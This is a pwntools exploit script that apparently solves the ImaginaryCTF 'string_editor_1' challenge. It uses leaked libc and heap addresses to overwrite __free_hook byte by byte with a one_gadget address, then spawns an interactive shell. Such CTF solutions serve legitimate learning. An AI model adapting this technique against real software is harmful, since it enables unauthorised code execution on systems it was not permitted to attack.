#!/usr/bin/env python3


from pwn import *


e = ELF("./string_editor_1")
libc = ELF("./libc.so.6")
#r = remote("chal.imaginaryctf.org",42004)
r = process("./string_editor_1_patched")
r.recvuntil(b"But first, a word from our sponsors: ")
system = r.recvline().strip(b"\n")
libc_base = int(system,16) - libc.sym["system"]
one_gadget = hex(libc_base + 0xe6c81)
log.info("The libc base address is " + hex(libc_base))
log.info("The address of system function in libc is " + str(system))
i = 0
while(i < 7):
    if(i == 0):
        r.sendafter(b"pallette)\n",b"0\n")
        r.sendafter(b"index?\n",b"0\n")
        r.recvuntil(b"DEBUG: ")
        heap_leak = int(r.recvline().strip(b"\n"),16)
        log.info("Heap leak is " + hex(heap_leak))
        free_hook = libc_base + libc.sym["__free_hook"]
        log.info("The address of free hook in libc is " + hex(free_hook))
        difference = hex(free_hook - heap_leak)
        diff = int(difference,16)
        log.info("The difference is " + difference)
    else:
        r.sendafter(b"pallette)\n",f"{diff}\n")
        val = chr(int(one_gadget[-2:],16)) + '\n'
        r.sendafter(b"index?\n",val)
        one_gadget = one_gadget[0:-2]
        diff+=1
    i+=1
r.sendafter(b"pallette)\n",b"15\n")
r.interactive()


